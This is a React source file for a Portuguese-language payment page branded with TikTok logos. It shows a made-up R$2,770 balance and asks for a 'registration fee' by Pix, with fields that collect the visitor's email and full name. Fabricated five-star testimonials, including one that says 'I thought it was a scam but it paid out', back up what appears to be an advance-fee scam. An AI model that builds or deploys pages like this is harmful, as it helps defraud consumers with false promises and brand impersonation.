import { useState } from "react";
import { Button } from "@/components/ui/button";
import { CheckCircle2, Star, User } from "lucide-react";
import tiktokLogo from "@/assets/tiktok-logo.png";
import tiktokRound from "@/assets/tiktok-round.png";

const TAX = 37.90;
const SALDO = 2770.0;

const testimonials = [
{
  name: "Matheus Henrique Santos",
  text: '"rapazz e nao foi que esse ngc do gol de premios deu boa aqui tbm familia KKKKKK"'
},
{
  name: "Ana Paula Silva",
  text: '"recebi em menos de 2 minutos, muito rápido! recomendo demais"'
},
{
  name: "Carlos Eduardo",
  text: '"pensei que era golpe mas recebi certinho, top demais!!"'
}];


const Pagamento = () => {
  const [email, setEmail] = useState("");
  const [nomeCompleto, setNomeCompleto] = useState("");

  const handlePagar = () => {
    // Redirect to actual payment
    window.open("https://pay.exemplo.com", "_blank");
  };

  return (
    <div className="flex min-h-screen flex-col bg-gray-50">
      {/* Top banner */}
      <div className="bg-primary py-3 text-center">
        <p className="text-sm font-bold text-primary-foreground">Pagamento 100% Seguro</p>
      </div>

      <div className="px-4 py-6 space-y-5">
        {/* Header with logo and saldo */}
        <div className="flex items-center justify-between">
          <img src={tiktokLogo} alt="TikTok" className="h-8" />
          <div className="rounded-full border-2 border-secondary px-4 py-1.5">
            <p className="text-[10px] text-gray-400 leading-none">Saldo:</p>
            <p className="text-sm font-bold text-black">R$ {SALDO.toFixed(2).replace(".", ",")}</p>
          </div>
        </div>

        {/* Info banner */}
        <div className="rounded-xl bg-black px-4 py-2.5 flex items-center justify-center gap-2">
          <p className="text-xs font-medium text-white">Confirmação instantânea •</p>
          <p className="text-xs font-medium text-white">PIX cai em até 2 minutos</p>
        </div>

        {/* Product card */}
        <div className="rounded-2xl bg-white border border-gray-200 p-5">
          <div className="flex items-center gap-4 mb-4">
            <div className="h-14 w-14 rounded-2xl overflow-hidden shrink-0">
              <img src={tiktokRound} alt="TikTok" className="h-full w-full object-cover" />
            </div>
            <div>
              <p className="text-sm font-bold text-black">Taxa De Cadastro</p>
              
            </div>
          </div>
          



        </div>

        {/* Identificação */}
        <div className="rounded-2xl bg-white border border-gray-200 p-5">
          <div className="flex items-center gap-2 mb-5">
            <div className="h-8 w-8 rounded-full bg-primary/10 flex items-center justify-center">
              <User className="h-4 w-4 text-primary" />
            </div>
            <h3 className="text-lg font-bold text-black">Identificação</h3>
          </div>

          <div className="space-y-4">
            <div>
              <label className="text-sm font-semibold text-black block mb-2">Email</label>
              <input
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Email"
                className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-black placeholder:text-gray-300 outline-none focus:border-primary" />

            </div>
            <div>
              <label className="text-sm font-semibold text-black block mb-2">Nome completo</label>
              <input
                type="text"
                value={nomeCompleto}
                onChange={(e) => setNomeCompleto(e.target.value)}
                placeholder="Nome e sobrenome"
                className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-black placeholder:text-gray-300 outline-none focus:border-primary" />

            </div>
          </div>
        </div>

        {/* Método de pagamento */}
        <div className="rounded-2xl bg-white border border-gray-200 p-5">
          <h3 className="text-xl font-bold text-black mb-4">Escolha um método de pagamento...</h3>
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <span className="text-secondary text-xl">💠</span>
              <div>
                <p className="text-sm font-bold text-black">Pagamento via Pix</p>
                <p className="text-xs text-gray-400">Aprovação imediata.</p>
              </div>
            </div>
            <CheckCircle2 className="h-6 w-6 text-secondary" />
          </div>
        </div>

        {/* Pagar button */}
        <Button
          onClick={handlePagar}
          disabled={!email.trim() || !nomeCompleto.trim()}
          className="w-full h-14 rounded-2xl text-base font-bold bg-primary hover:bg-primary/90 text-primary-foreground uppercase tracking-wider disabled:opacity-40">

          Pagar
        </Button>

        <p className="text-xs text-gray-400 text-center leading-relaxed">
          Ao finalizar o pagamento você concorda com nossos termos de uso e privacidade.
        </p>

        {/* Testimonials */}
        <div className="flex gap-4 overflow-x-auto pb-4 -mx-4 px-4">
          {testimonials.map((t) =>
          <div key={t.name} className="min-w-[260px] rounded-2xl bg-white border border-gray-200 p-4">
              <div className="flex items-center gap-3 mb-2">
                <div className="h-10 w-10 rounded-full bg-gray-200 flex items-center justify-center shrink-0">
                  <User className="h-5 w-5 text-gray-400" />
                </div>
                <div>
                  <p className="text-sm font-bold text-black">{t.name}</p>
                  <div className="flex gap-0.5">
                    {Array.from({ length: 5 }).map((_, i) =>
                  <Star key={i} className="h-3 w-3 fill-yellow-400 text-yellow-400" />
                  )}
                  </div>
                </div>
              </div>
              <p className="text-xs text-gray-500 leading-relaxed">{t.text}</p>
            </div>
          )}
        </div>
      </div>
    </div>);

};

export default Pagamento;